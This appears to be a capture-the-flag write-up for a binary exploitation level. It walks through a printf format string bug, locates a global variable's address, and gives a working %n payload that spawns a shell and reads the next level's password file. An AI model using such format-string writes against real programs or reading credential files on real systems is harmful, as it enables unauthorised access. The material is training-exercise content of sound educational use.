# Let's start with
info functions
info variables
# We can see main functiom, system, gets, printf, and 'v' call
# Also we can see m variable which adress is 0x0804988c, maybe we'll need that later
# let's objetdump -d level3, we can see that our m variable is used in v func
# seem's like our binary use printf to print what we give him.
# After some research, I've found an exloit named format string that works with printf
# links: https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf 
# https://www.exploit-db.com/papers/23985
# https://cs155.stanford.edu/papers/formatstring-1.2.pdf
# Which allow us to write on memory with the %n
# 0x080484da <+54>:	mov    eax,ds:0x804988c
# 0x080484df <+59>:	cmp    eax,0x40
# We can see on this part that the value stored in m (we give to our program while running) is compared to 0x40 value which is 64 octet. We know last 4 octet are for the address, so -> 60 - 4.
# Let's now try to pass the cmp check with the %n exploit with giving the right numbers of characters with the adress
# >>> struct.pack("I", 0x804988c)
#	'\x8c\x98\x04\x08'
# Let's use the same trick with cat pipe to open our new shell
(echo -e "\x8c\x98\x04\x08AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%4\$n"; cat) | ./level3

# cat /home/user/level4/.pass 
